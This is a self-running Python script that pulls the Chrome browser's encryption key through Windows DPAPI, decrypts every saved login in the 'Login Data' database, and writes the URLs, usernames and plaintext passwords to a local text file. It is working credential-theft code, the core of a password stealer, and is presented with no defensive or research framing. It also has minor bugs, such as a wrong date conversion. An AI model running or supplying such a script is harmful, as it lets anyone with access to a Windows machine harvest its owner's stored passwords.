import win32crypt
from Crypto.Cipher import AES
from win32ctypes.pywin32 import pywintypes

import os
import json
import shutil
import base64
import sqlite3
from datetime import datetime, timedelta

class Chrome:

    def __init__(self):
        self.main()

    @staticmethod
    def get_chrome_datetime(chromedate):
        """Return a `datetime.datetime` object from a chrome format datetime
        Since `chromedate` is formatted as the number of microseconds since January 1601"""
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
    

    @staticmethod
    def get_encryption_key():
        """
        Gets the encryption key used by Google Chrome to encrypt and decrypt the user's saved passwords.
        
        Returns:
        The encryption key as a bytes object.
        """
        # Get the path to the Local State file where the encryption key is stored.
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        # Read the Local State file and extract the encrypted key.
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        # Remove the first 5 bytes of the encrypted key before decryption, as they are not part of the key..
        # The prefix "DPAPI" is included in the encrypted key but should not be used in decryption
        key = key[5:]

        # Decrypt the key using the Windows API function CryptUnprotectData.
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


    @staticmethod
    def decrypt_password(password, key):

        """
        Decrypts a password string using the provided key.

        Args:
            password (bytes): The encrypted password string to decrypt.
            key (bytes): The encryption key to use for decryption.

        Returns:
            str: The decrypted password string.
        """

        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except UnicodeDecodeError:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except pywintypes.error:
                return ""


    def main(self):

        """Retrieve login information from Google Chrome and write it to a text file.

        This function connects to a database containing login information from Google Chrome,
        retrieves the login information, decrypts the passwords using a key, and writes the
        login information to a text file. The text file will contain the origin URL, username,
        password, and creation date for each login.

        Returns:
            None
        """

        # Get encryption key
        key = self.get_encryption_key()

        # Set the path to the database file
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
        
        # Create a temporary file and copy the database to it
        filename = "temp.db"
        shutil.copyfile(db_path, filename)
        
        try:
            # Connect to the database and open a file for writing
            with sqlite3.connect(filename) as db, open('temp.txt', 'w') as f:
                cursor = db.cursor()

                # Execute a SELECT query to retrieve login information
                cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")

                # Loop through the results and write them to the file
                for row in cursor.fetchall():
                    origin_url, username_value, password_value, date_created = row

                    # Decrypt the password using the encryption key
                    password = self.decrypt_password(password_value, key)
                    if password:

                        # Convert the date from Chrome's internal format to a human-readable format
                        date_created = self.get_chrome_datetime(date_created / 10**6)

                        # Write the login information to the file
                        f.write(f"Origin URL: {origin_url}\n")
                        f.write(f"Username: {username_value}\n")
                        f.write(f"Password: {password}\n")
                        f.write(f"Created: {date_created}\n\n")
        except sqlite3.Error as e:
            # Handle any errors that occur during database access
            print("As error occured:", e)
        finally:
            # Close the database connection and delete the temporary file
            db.close()
            os.remove(filename)


Chrome()
